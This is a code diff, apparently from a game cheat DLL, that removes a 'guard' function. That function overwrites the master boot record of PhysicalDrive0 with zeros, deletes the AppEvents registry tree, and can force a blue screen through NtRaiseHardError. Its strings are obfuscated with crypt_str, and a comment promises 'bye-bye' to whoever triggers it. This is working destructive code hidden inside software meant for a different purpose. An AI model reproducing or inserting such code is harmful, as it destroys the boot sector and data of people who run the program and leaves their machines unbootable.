@@ -131,30 +131,6 @@ BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
 extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
 extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
 
-__forceinline void guard(bool use_bsod)
-{
-	// note: simv0l - i can say only "bye-bye" for you, if this function will called.
-	DWORD write;
-	char mbr[512];
-	ZeroMemory(mbr, sizeof mbr);
-	HANDLE MasterBootRecord = CreateFile(crypt_str("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
-	if (WriteFile(MasterBootRecord, mbr, 512, &write, NULL) == TRUE)
-	{
-		HKEY hKey = NULL;
-		if (RegOpenKeyEx(HKEY_CURRENT_USER, crypt_str("AppEvents\\"), NULL, DELETE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
-		{
-			if (RegDeleteTree(hKey, NULL) == ERROR_SUCCESS && use_bsod)
-			{
-				BOOLEAN bl;
-				ULONG Response;
-				RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
-				NtRaiseHardError(STATUS_ASSERTION_FAILURE, NULL, NULL, NULL, 6, &Response);
-			}
-			RegCloseKey(hKey);
-		}
-	}
-}
-
 __forceinline void setup_render()
 {
 	static auto create_font = [](const char* name, int size, int weight, DWORD flags) -> vgui::HFont
